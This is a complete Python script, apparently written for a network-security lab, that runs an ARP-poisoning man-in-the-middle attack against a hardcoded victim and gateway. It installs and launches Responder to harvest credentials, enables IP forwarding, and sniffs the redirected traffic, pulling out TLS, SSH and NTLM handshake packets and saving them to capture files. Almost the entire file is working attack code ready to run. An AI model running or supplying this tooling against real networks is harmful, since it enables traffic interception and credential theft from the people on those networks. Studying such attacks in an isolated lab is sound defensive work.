from scapy.all import *
import subprocess
import shutil
import os
import signal
import sys
import time
import threading

from scapy.layers.inet import TCP, UDP, IP
from scapy.layers.l2 import ARP
from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
from scapy.layers.tls.record import TLS

# -------- Configuration --------
host1_ip = "192.168.100.101"  # Victim
host2_ip = "192.168.100.1"    # Gateway
interface = "eth1"
capture_file = "arp_poison_capture.pcap"
key_file = "key_exchange_only.pcap"
responder_process = None
packets = []
key_packets = []

# -------- Responder Setup --------
def check_and_install_responder():
    print("[*] Checking for Responder...")
    if shutil.which("responder") is None:
        print("[!] Responder not found. Installing...")
        subprocess.run(["sudo", "apt", "update"], check=True)
        subprocess.run(["sudo", "apt", "install", "-y", "responder"], check=True)
        print("[+] Responder installed.")
    else:
        print("[+] Responder is already installed.")

def start_responder():
    print(f"[*] Starting Responder on {interface}...")
    global responder_process
    responder_process = subprocess.Popen(
        ["responder", "-I", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def stop_responder():
    global responder_process
    if responder_process:
        print("[*] Stopping Responder...")
        responder_process.terminate()
        try:
            responder_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            responder_process.kill()
        print("[+] Responder stopped.")

# -------- ARP Poisoning --------
def get_mac(ip):
    print(f"[+] Resolving MAC for {ip}")
    answered, _ = sr(ARP(pdst=ip), timeout=2, retry=2, verbose=False)
    for sent, received in answered:
        return received.hwsrc
    return None

def poison_arp(victim_ip, victim_mac, spoof_ip):
    arp_response = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def enable_ip_forwarding():
    print("[*] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print("[*] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# -------- Sniffing & Protocol Detection --------
def identify_protocol(packet):
    if TCP in packet:
        ports = [packet[TCP].sport, packet[TCP].dport]
        if 80 in ports:
            return "HTTP"
        elif 443 in ports:
            return "HTTPS"
        elif 21 in ports or 20 in ports:
            return "FTP"
        elif 22 in ports:
            return "SSH/SFTP"
        elif 23 in ports:
            return "Telnet"
        elif 445 in ports:
            return "SMB"
        elif 137 in ports or 138 in ports or 139 in ports:
            return "NetBIOS"
        elif 389 in ports:
            return "LDAP"
        return "Other TCP"
    elif UDP in packet:
        ports = [packet[UDP].sport, packet[UDP].dport]
        if 137 in ports or 138 in ports or 139 in ports:
            return "NetBIOS (UDP)"
        elif 389 in ports:
            return "LDAP (UDP)"
        return "Other UDP"
    return "Other"

def is_key_exchange(packet):
    if TLS in packet:
        if packet.haslayer(TLSClientHello):
            return "TLS Client Hello"
        elif packet.haslayer(TLSServerHello):
            return "TLS Server Hello"
    elif TCP in packet and packet[TCP].dport == 22:
        return "SSH Key Exchange"
    elif TCP in packet and packet[TCP].dport == 445:
        if b"NTLMSSP" in bytes(packet):
            return "SMB NTLM Handshake"
    elif UDP in packet and packet[UDP].dport == 389:
        if b"NTLMSSP" in bytes(packet):
            return "LDAP NTLM Handshake"
    return None

def sniff_and_log(filter_ips):
    print("[*] Sniffing packets... Logging to file.")

    def process_packet(packet):
        if IP in packet:
            src = packet[IP].src
            dst = packet[IP].dst
            if src in filter_ips or dst in filter_ips:
                proto = identify_protocol(packet)
                key_event = is_key_exchange(packet)
                if key_event:
                    print(f"[KEY EXCHANGE] {key_event} | {src} -> {dst}")
                    key_packets.append(packet)
                else:
                    print(f"[{proto}] {src} -> {dst}")
                packets.append(packet)

    sniff(filter="ip", prn=process_packet, store=False, iface=interface)

# -------- Main --------
def main():
    check_and_install_responder()
    start_responder()
    host1_mac = get_mac(host1_ip)
    host2_mac = get_mac(host2_ip)

    if not host1_mac or not host2_mac:
        print("[-] Could not resolve MACs. Exiting.")
        stop_responder()
        sys.exit(1)

    enable_ip_forwarding()

    sniff_thread = threading.Thread(target=sniff_and_log, args=([host1_ip, host2_ip],), daemon=True)
    sniff_thread.start()

    print("[*] Beginning ARP poisoning. Press CTRL+C to stop.")
    try:
        while True:
            poison_arp(host1_ip, host1_mac, host2_ip)
            poison_arp(host2_ip, host2_mac, host1_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Cleaning up...")
        restore_arp(host1_ip, host1_mac, host2_ip, host2_mac)
        restore_arp(host2_ip, host2_mac, host1_ip, host1_mac)
        disable_ip_forwarding()
        stop_responder()
        wrpcap(capture_file, packets)
        wrpcap(key_file, key_packets)
        print(f"[+] Full packet capture saved to: {capture_file}")
        print(f"[+] Key exchange packets saved to: {key_file}")
        print("[+] Lab complete. Analyze results in Wireshark.")

if __name__ == "__main__":
    main()
